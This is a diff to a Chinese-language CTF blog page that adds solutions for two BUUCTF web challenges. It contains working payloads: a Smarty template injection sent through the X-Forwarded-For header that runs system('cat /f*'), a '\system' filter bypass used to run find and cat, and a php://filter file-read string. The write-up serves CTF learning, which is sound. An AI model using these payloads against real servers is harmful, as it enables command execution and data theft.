@@ -485,6 +485,19 @@ get传参cat&amp;#x3D;do">
 <p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/111.png"></p>
 <p>要有woofers,meowers,index三个之一才能触发include函数</p>
 <p>最终payload:?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;flag</p>
+<h4 id="36-BJDCTF2020-The-mystery-of-ip"><a href="#36-BJDCTF2020-The-mystery-of-ip" class="headerlink" title="36.[BJDCTF2020]The mystery of ip"></a>36.[BJDCTF2020]The mystery of ip</h4><p>考的是ssti模版注入</p>
+<p>php页面，查找下php相关的模版注入，常见的有twig，smarty，blade。这题是smarty模版注入</p>
+<p><img src="/source/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/112.png"></p>
+<p>添加xff头发现回显了，修改xff为{system(‘cat &#x2F;f*’)}即可</p>
+<p>37.[网鼎杯 2020 朱雀组]phpweb</p>
+<p>抓包发现post参数</p>
+<p><img src="/source/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/113.png"></p>
+<p>通过回显的日期发现：func为函数,p为内容</p>
+<p>这题过滤了system，用\绕过</p>
+<p>func&#x3D;\system&amp;p&#x3D;find &#x2F; -name flag*</p>
+<p>找到名字</p>
+<p><img src="/source/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/114.png"></p>
+<p>payload:func&#x3D;\system&amp;p&#x3D;cat &#x2F;tmp&#x2F;flagoefiu4r93</p>
 </section>
     
         
